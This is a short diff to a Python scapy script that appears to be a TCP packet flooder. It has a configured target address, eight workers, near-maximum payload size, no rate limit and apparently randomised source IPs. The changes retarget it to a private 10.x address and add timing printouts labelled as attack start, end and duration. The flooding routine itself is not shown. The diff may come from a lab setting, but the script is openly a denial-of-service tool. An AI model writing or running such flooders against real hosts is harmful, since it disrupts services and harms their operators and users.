@@ -2,9 +2,10 @@ from scapy.all import conf, IP, TCP, Raw, RandIP
 import multiprocessing
 import random
 import time
+from datetime import datetime
 import os
 
-TARGET = "192.168.1.23"
+TARGET = "10.10.20.23"
 WORKERS = 8
 PAYLOAD_SIZE = 65495  # Max practical payload for TCP (65,535 - 20 (IP hdr) - 20 (TCP hdr))
 RATE_LIMIT = 0.0000
@@ -39,6 +40,7 @@ def start_workers():
     return workers
 
 if __name__ == "__main__":
+    tick=datetime.now()
     print(f"""\n[CONFIG]
 Target: {TARGET}
 Workers: {WORKERS}
@@ -50,6 +52,10 @@ Theoretical Rate: {round(1 / RATE_LIMIT * WORKERS) if RATE_LIMIT else "Unlimited
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
+        tock=datetime.now()
+        print(f"[!] Attack started at: {tick.strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"[!] Attack ended at: {tock.strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"\n[!] Attack duration: {tock-tick}")
         print("\n[!] Stopping workers...")
         for w in workers:
             w.terminate()
